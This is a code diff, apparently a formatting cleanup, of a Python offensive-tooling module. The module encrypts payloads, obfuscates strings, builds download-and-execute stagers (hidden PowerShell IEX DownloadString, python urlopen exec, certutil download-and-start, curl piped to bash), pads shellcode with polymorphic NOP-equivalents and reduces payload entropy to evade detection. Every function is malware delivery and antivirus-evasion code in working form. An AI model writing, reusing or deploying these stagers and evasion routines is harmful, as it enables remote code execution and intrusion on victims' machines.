@@ -88,8 +88,7 @@ def aes_encrypt_payload(payload: bytes) -> tuple[bytes, bytes]:
     # Format: [12 bytes nonce][ciphertext][16 bytes tag]
     encrypted_blob = nonce + ciphertext_with_tag
 
-    logger.debug("AES-256-GCM encrypted %d bytes → %d bytes",
-                 len(payload), len(encrypted_blob))
+    logger.debug("AES-256-GCM encrypted %d bytes → %d bytes", len(payload), len(encrypted_blob))
     return encrypted_blob, key
 
 
@@ -201,7 +200,7 @@ def string_obfuscate(s: str) -> str:
     i = 0
     while i < len(s):
         group_size = min(random.randint(1, 3), len(s) - i)
-        group = s[i:i + group_size]
+        group = s[i : i + group_size]
 
         if group_size == 1:
             parts.append(f"chr({ord(group)})")
@@ -240,32 +239,22 @@ def generate_stager(payload_url: str, method: str = "powershell") -> str:
 
     if method == "powershell":
         return (
-            f"powershell -nop -w hidden -ep bypass -c "
-            f"\"IEX(New-Object Net.WebClient).DownloadString('{payload_url}')\""
+            f"powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{payload_url}')\""
         )
 
     elif method == "python":
-        return (
-            f"python3 -c \"import urllib.request,os;"
-            f"exec(urllib.request.urlopen('{payload_url}').read())\""
-        )
+        return f"python3 -c \"import urllib.request,os;exec(urllib.request.urlopen('{payload_url}').read())\""
 
     elif method == "certutil":
         # certutil downloads to disk, then executes
         tmp_name = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.exe"
-        return (
-            f"certutil -urlcache -split -f {payload_url} {tmp_name} "
-            f"&& start /b {tmp_name}"
-        )
+        return f"certutil -urlcache -split -f {payload_url} {tmp_name} && start /b {tmp_name}"
 
     elif method == "curl":
         return f"curl -sk {payload_url} | bash"
 
     else:
-        raise ValueError(
-            f"Unsupported stager method: {method}. "
-            f"Use: powershell, python, certutil, curl"
-        )
+        raise ValueError(f"Unsupported stager method: {method}. Use: powershell, python, certutil, curl")
 
 
 def polymorphic_wrapper(shellcode: bytes) -> bytes:
@@ -291,13 +280,13 @@ def polymorphic_wrapper(shellcode: bytes) -> bytes:
     """
     # NOP-equivalent instruction pairs (push/pop register)
     nop_equivalents: list[bytes] = [
-        b"\x90",           # NOP
-        b"\x50\x58",       # PUSH EAX; POP EAX
-        b"\x51\x59",       # PUSH ECX; POP ECX
-        b"\x52\x5a",       # PUSH EDX; POP EDX
-        b"\x53\x5b",       # PUSH EBX; POP EBX
-        b"\x87\xc0",       # XCHG EAX, EAX (NOP equivalent)
-        b"\x87\xc9",       # XCHG ECX, ECX
+        b"\x90",  # NOP
+        b"\x50\x58",  # PUSH EAX; POP EAX
+        b"\x51\x59",  # PUSH ECX; POP ECX
+        b"\x52\x5a",  # PUSH EDX; POP EDX
+        b"\x53\x5b",  # PUSH EBX; POP EBX
+        b"\x87\xc0",  # XCHG EAX, EAX (NOP equivalent)
+        b"\x87\xc9",  # XCHG ECX, ECX
     ]
 
     # Random prefix
@@ -313,8 +302,9 @@ def polymorphic_wrapper(shellcode: bytes) -> bytes:
         suffix += random.choice(nop_equivalents)
 
     result = prefix + shellcode + suffix
-    logger.debug("Polymorphic wrapper: %d prefix + %d shellcode + %d suffix bytes",
-                 len(prefix), len(shellcode), len(suffix))
+    logger.debug(
+        "Polymorphic wrapper: %d prefix + %d shellcode + %d suffix bytes", len(prefix), len(shellcode), len(suffix)
+    )
     return result
 
 
@@ -357,6 +347,7 @@ def entropy_reduce(data: bytes) -> bytes:
 
     # Header: original data length (4 bytes, little-endian)
     import struct
+
     header = struct.pack("<I", len(data))
 
     # Interleave: 1 byte of real data, then N bytes of padding
@@ -369,9 +360,12 @@ def entropy_reduce(data: bytes) -> bytes:
         pattern = padding_patterns[i % len(padding_patterns)]
         result.extend(pattern[:pad_ratio])
 
-    logger.debug("Entropy reduced: %d → %d bytes (%.1f%% overhead)",
-                 len(data), len(result),
-                 (len(result) - len(data)) / max(len(data), 1) * 100)
+    logger.debug(
+        "Entropy reduced: %d → %d bytes (%.1f%% overhead)",
+        len(data),
+        len(result),
+        (len(result) - len(data)) / max(len(data), 1) * 100,
+    )
     return bytes(result)
 
 
@@ -391,6 +385,7 @@ def entropy_restore(padded_data: bytes) -> bytes:
         ValueError: If data format is invalid.
     """
     import struct
+
     if len(padded_data) < 4:
         raise ValueError("Padded data too short (missing header)")
 
@@ -404,9 +399,6 @@ def entropy_restore(padded_data: bytes) -> bytes:
         offset += 1 + pad_ratio  # Skip padding bytes
 
     if len(result) != original_len:
-        raise ValueError(
-            f"Data restoration failed: expected {original_len} bytes, "
-            f"got {len(result)}"
-        )
+        raise ValueError(f"Data restoration failed: expected {original_len} bytes, got {len(result)}")
 
     return bytes(result)
